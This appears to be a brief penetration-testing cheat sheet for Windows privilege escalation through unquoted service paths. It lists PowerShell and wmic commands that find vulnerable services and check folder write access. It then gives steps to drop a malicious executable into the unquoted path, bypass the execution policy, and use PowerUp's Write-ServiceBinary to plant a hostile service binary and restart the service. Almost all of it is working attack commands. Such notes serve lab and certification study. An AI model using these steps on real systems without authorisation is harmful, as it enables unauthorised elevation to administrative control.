```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName # Find some unquoted services 
```

```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ # List services that are potentially vulnerable
```

```powershell
Start-Service $SERVICE_NAME # Check if I can start service
Stop-Service $SERVICE_NAME # Check if I can start service
Restart-Service $SERVICE_NAME # Check if I can restart service
```

```powershell
icacls "C:\" # Check access rights
icacls "C:\Program Files" # Check access rights
```

Add the malicious `.exe` (`Current.exe`) in the unquoted folder and start the service (that will run `Current.exe` file).
For example: https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService # PowerUp.ps1 module
Write-ServiceBinary -Name $SERVICE_NAME -Path "C:\Program Files\Development.exe"
Restart-Service $SERVICE_NAME
```

For example:
![](Images/Pasted%20image%2020250206174214.png)







